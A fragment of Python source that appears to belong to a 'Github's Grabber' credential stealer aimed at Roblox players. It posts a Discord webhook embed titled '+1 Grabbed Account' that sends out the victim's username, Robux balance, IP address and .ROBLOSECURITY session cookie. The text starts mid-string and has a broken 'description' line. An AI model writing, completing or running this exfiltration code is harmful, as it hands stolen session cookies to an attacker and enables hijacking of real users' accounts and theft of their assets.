LL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL__MONKEY_WALL'
discord = Discord(url=webhook)
discord.post(
    username="Github's Grabber",
    avatar_url="https://cdn.discordapp.com/attachments/854368586448240671/1028560129207062608/unknown.png",
    embeds=[
        {
            "username": "Free Github's Grabber",
            "title": "💸 +1 Grabbed Account 🕯",
            "description" :| [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
